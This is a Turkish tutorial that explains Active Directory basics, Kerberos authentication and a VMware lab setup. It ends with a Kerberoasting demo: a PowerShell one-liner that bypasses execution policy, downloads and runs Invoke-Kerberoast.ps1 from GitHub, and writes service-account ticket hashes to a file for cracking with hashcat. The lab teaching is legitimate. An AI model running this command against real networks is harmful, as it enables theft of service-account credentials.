# Windows Active Directory Ortamı Nedir, Nasıl Çalışır, Nasıl Saldırılabilir

## Giriş

Herkese merhaba, bu yazı boyunca active directory dünyasına derinlemesine bir dalış yapacak, lab ortamımızı hazırlayacak ve active directory ortamının nasıl çalıştığını ne gibi yapıtaşlarından oluştuğunu anlamaya çalışacağız.

Bunun haricinde bu alana sızma testi nasıl yapılır ve ne gibi teknikler kullanılabilir sorularına da yanıt aramaya çalışacağız. 

### Tanım

Active directory, ağ üzerinde erişilmek veya paylaşılmak istenen veriyi hiyerarşik bir dizin yapısı ile yetkili kullanıcılara sunan bir dizin sistemidir. Ağ üzerinden bu sisteme dahil cihazlar (yazıcılar,kullanıcı bilgisayarları, veritabanlar, vb.) ağ üzerinde başka bir noktada erişilmek istenen kaynağa active directory sistemine dahil protokoller aracılığı ile yetkilendirilip kolay bir biçimde erişebilirler. Active directroy ortamı sistem yöneticilerinin işini de bir hayli kolaylaştırmaktadır. Bu ortama dahil cihazlar, tek bir birimden (Domain Controller) güncellenebilir, yapılandırılabilir ve sürdürülebilirliği sağlanabilir. 

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/active-directory-troubleshooting.jpg](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/active-directory-troubleshooting.jpg)

### Active Directory'de Domainler

Active directory ortamı altına erişilebilen veriler, bir domain (alan adı) altında temsil edilirler.  Domainler active directory ortamı altında mantıksal bölümlendirmeleri temsil ederler. Active directory altındaki her domain domain her zaman benzersiz bir isim yapısı ile temsil edilir. Ör : **prismacsi.local**

### Active Directory'de Tree ve Forest

Aynı domainden türetilmiş, active directory ortamına ait bir grup cihaza AD Tree denmektedir. Domainin temsil ettiği cihazlar her zaman root domain ağacın en başında yer almak üzere bir hiyerarşi oluştururlar. Örneğin root domain [prismacsi.local](http://prismacsi.local) ise ağacı oluşturan ve domainler tarafından temsil edilen diğer objeler bu domainden türeyeceklerdir. Örneğin : [support.prismacsi.local](http://support.prismacsi.local) , [database.prismacsi.local](http://database.prismacsi.local)  gibi.

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Untitled.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Untitled.png)

Ağaç hiyerarşisinden oluşan objelerin birbirlerine bağlanması ile **AD Forest** oluşmaktadır. Active directory ortamının var olabilmesi için bir **Forest** oluşturulması şarttır. Bu işlemler lab kurulumunda uygulamalı olarak gösterilecektir.

### Active Directory Domain Controller

Active directory'de domain controller, kimlik doğrulaması işlemini gerçekleştiren servisleri (Ör : kerberos) host ederler. Böylece sisteme dahil olmak isteyen her kullanıcı önce domain controller tarafına yönlendirilmektedir. Domain controller, active directory ortamındaki kullanıcı ve bilgisayar hesaplarını yönetmek, konfigüre etmek işlemlerini yürütmek için sistem yöneticileri tarafından kullanılır. Başka bir deyişle active directory ortamının komuta merkezidir.

Ör : [prismacsi.local](http://prismacsi.local) domainine dahil olmaya çalışan bir hesap:

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-17_02-15-00.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-17_02-15-00.png)

### Active Directory Database

Kullanıcı kimlikleri, active directory ortamına dahil bilgisayarlar, gruplar, servisler ve kaynaklar vb. active directory veritabanında tutulurlar. Bu veritabanı **ntds.dit** adında tek bir dosyadan oluşur. Varsayılan olarak **C:\NTDS** dizininde saklanır.

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Untitled%201.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Untitled%201.png)

### LDAP

LDAP açılımı : Lightweight Directroy Access Protocol , dizin sunucuları ile iletişime geçilmesini sağlayan bir protokoldür. Genellikle kimlik doğrulama, kullanıcılar, gruplar ve uygulamalar hakkında veri depolamak için kullanılır. LDAP servisi ağ üzerinde ne olduğunu takip etmek ve bu verileri sunmakla sorumludur.

### Active Directory DNS

Active directory'nin çalışması için DNS bir hayli önemlidir. Active directory ortamına dahil bir dns sunucusu bu ortama ait domainlerin hangi cihazlarla eşleştiğini söylemektedir. Örneğin : [ankara.prismacsi.local](http://ankara.prismacsi.local) domainine gitmek isteyen ve active directory ortamına dahil kullanıcı bu domaine bağlanmak için istek yaptığı zaman, yine bu ortama dahil bir DNS sunucusu bu isteği bir IP adresine çözmekte ve bağlantıyı mümkün kılmaktadır.

### Group Policy

Group Policy kullanıcı ve bilgisayar ayarlarını, bir grup kullanıcıya veya tek bir kullanıcıya göre tanımlamak için kullanılır.

### Kerberos

Kerberos, bir ağ kimlik doğrulaması protokolüdür. Sunucu/istemci uygulamalarının güvenli olmayan ağlar üzerinden, şifreli ve güvenli bir kanal aracılığı ile kimlik doğrulaması yapmak amacı Massachusetts Institute of Technology tarafından geliştirilmiştir. Kerberos protokolü güçlü bir kriptografik algortima kullanmaktadır, bu sayede istemci sunucuya ve sunucu istemciye kimliklerini ispat edebilmektedir.

### Kerberos Kimlik Doğrulama Aşamaları

1. İstemci Key Distribution Center(KDC)'a bir kimlik doğrulama ticket'ı(bilet) (TGT) isteği yollar.
2. KDC bu isteği onaylar ve şifrelenmiş kimlik doğrulama ticket'ını(TGT) ve oturum anahtarını istemciye yollar
3. TGT Ticket Granting Service (TGS) gizli anahtarı ile şifrelenir.
4. İstemci TGT yi sisteminde tutar. TGT zaman aşımına uğradığında KDC'den yenisini ister.

Eğer istemci ağ üzerinde bir servise veya kaynağa ulaşmak istiyorsa adımlar şu şekilde olacaktır:

1. İstemci TGT'sini TGS ye ulaşmak istediği kaynağın Service Principal Name (SPN) numarası ile birlikte KDC ye yollar.
2. KDC istemciden gelen TGT yi onaylar ve kullanıcının kaynağa erişme yetkisi olup olmadığını kontrol eder. 
3. TGS istemciye geçerli bir oturum anahtarı gönderir.
4. İstemci bu anahtarı erişmek istediği servise erişmek için yönlendirir ve servis erişim izni sağlar.

Kerberosa yönelik saldırı yöntemleri yazının ilerleyen kısımlarında bahsedilecektir.

## Lab Kurulumu

Active Directory saldırılarını simüle etmemiz için yeterli bir lab ortamı kuralım. Lab elemanları şu şekilde:

- Domain Controller : Windows Server 2012 R2
- İstemci : Windows 7, Windows 10

İndirme linkleri :

- [https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2012-r2](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2012-r2)
- [https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)
- [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)

Sanallaştırma programları olarak virtualbox veya vmware kullanılabilir. Ben bu yazıda vmware kullanacağım. İki programında çalışma mantığı oldukça benzerdir.

### 1- Sanal Makine Oluşturma

**File → New Virtual Machine** seçeneğine tıklıyoruz

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-12-52.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-12-52.png)

→**next**'e ****tıkladıktan sonra windows server iso dosyasını seçiyoruz.

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-13-16.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-13-16.png)

### 2- İşletim Sistemi Kurulumu

35GB alan verip ağ bağlantısı olarak **Host only** seçip standart Windows kurulumundan devam ediyoruz.İşletim sistemimizde grafik arayüzü bulunmasını istediğimizden aşağıdaki seçenekle devam ediyoruz.

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-15-48.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-15-48.png)

### 3- Statik IP Ataması

Kurulum tamamlandığı zaman domain controller'ımız için statik bir IP adresi belirlememiz gerekiyor. Bunun için **windows+r →** **ncpa.cpl** yazıp çalıştırıyoruz.

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-24-20.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-24-20.png)

### 4- Bilgisayar Adı Değiştirme

**windows+r → sysdm.cpl**

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Untitled%202.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Untitled%202.png)

### 5- Domain Controller Kurulumu

→**Add roles and features**

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-32-10.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-32-10.png)

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-32-31.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-32-31.png)

→ **Active Directroy Domain Services → DNS**

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-33-18.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-33-18.png)

Kurulum tamamlandığı zaman server management kısmından → **promote this server to a domain controller.**

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-34-55.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-34-55.png)

### 6- Forest Ekleme

Root domain'i girip →**next**

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-35-58.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-16_16-35-58.png)

İlgili kurumlar tamamlandığında domain controller kurma işlemi tamamlanmış olacak.

### 7- Active Directory Ortamına Client Ekleme

Ağ adaptörü olarak **Host Only** seçilmiş bir Windows istemci ile, **windows+r →sysdm.cpl →run** ile istemcinin domain controller ile haberleşebilmesi için statik ip atıyoruz, ayrıca tercih edilen DNS sunucusu kısmını domain controller'ın IP adresi ile değiştiriyoruz.

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-17_22-45-00.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-17_22-45-00.png)

Ardından **windows+r → ncpa.cpl** ile istemciye alakalı bir isim belirleyip, active directory ortamına domain controller tarafından oluşturulmuş bir hesap ile dahil oluyoruz.

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-17_22-45-28.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-17_22-45-28.png)

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-17_02-15-00%201.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-17_02-15-00%201.png)

## DHCP server

DHCP(Dynamic Host Configuration Protocol Server) kurularak, active directory ortamına dahil olan her cihaza manuel olarak IP atama işleminden kurtulmamızı sağlar. **Server Management →Add roles and features → DHCP** seçenekleri DC ye kurulabilir.

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-18_15-28-53.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-18_15-28-53.png)

Kurulumdan sonra ilgili ayarlar **windows + r → dhcpmgmt.msc** ile yapılır.

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-18_15-37-51.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Screenshot_from_2020-07-18_15-37-51.png)

## DNS

Dns servisini yükledikten sonra **windows+r → dnsmgmt.msc** ile açılan pencerede, yeni DNS kayıtları atanabilir, (ör : A, CNAME,MX) veya load balance (yük dengeleme) işlemleri için AD içerisinde ikinci bir DNS sunucusu yaratılabilir.

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Untitled%203.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Untitled%203.png)

## Active Directory'de Trust(Güven)

Active directory ortamında trust ağ üzerindeki çeşitli kaynaklara, kullanıcılara, gruplara ve bilgisayarlara erişilmesini mümkün kılar. Bu işlem iki domain arasında kimlik doğrulama ile gerçekleşir. İki adımlı bir süreçtir:

1. Trust sağlanır
2. İzinler atanır.

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Untitled%204.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Untitled%204.png)

Trust işlemi sağlanırken önceden bahsettiğimiz kerberos kimlik doğrulama aşamalarından geçilir. İlerleyen kısımlarda bahsedeceğimiz kerberoast isimli saldırı tipinde bu trust aşamasını hedef alıyor olacağız.

## Kerberoast

Kerberoasting, saldırganların active directory ortamındaki servis hesaplarınının kimlik bilgilerine offline bir şekilde brute force yapabilmesidir. Bu saldırı legacy windows istemcilerinin active directory tarafından desteklenmesi, kerberos ticketlarının şifrelenmesinde ve imzalanma türünden kaynaklanmaktadır. Bir kullanıcı spesifik bir kaynağı kullanmak istediği zaman imzalı bir kerberos ticket'ı alırlar, imzalama işlemi ise o servisi yürüten hesabın NTLM hashi ile yapılır. Sorun da buradan kaynaklanmaktadır.

Aşağıdaki komut ile bu durumu simüle etmek amacıyla bir kullanıcı ardından ise bir servis oluşturuyoruz.

```
net user kullanici1 Passw0rd! /ADD /DOMAIN
setspn -s http/<domain>:80 kullanici1

```

ardından github üzerinden bu saldırıyı gerçekleştiren scripti indirip çalıştırıyoruz:

```
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII hash.txt"
```

Elde edilen hash hashcat ile kırılabilir ve parola elde edilebilir.

![Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Untitled%205.png](Windows%20Active%20Directory%20Ortam%C4%B1%20Nedir,%20Nas%C4%B1l%20C%CC%A7al%C4%B1%200ec163af1f53499ca999de0e7d87bdd4/Untitled%205.png)

## Kaynakça ve İleri Okuma

- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)
- [https://ldap.com/](https://ldap.com/)
- [https://web.mit.edu/kerberos/](https://web.mit.edu/kerberos/)
- [https://www.varonis.com/blog/kerberos-authentication-explained/](https://www.varonis.com/blog/kerberos-authentication-explained/)
- [https://attack.mitre.org/techniques/T1558/003/](https://attack.mitre.org/techniques/T1558/003/)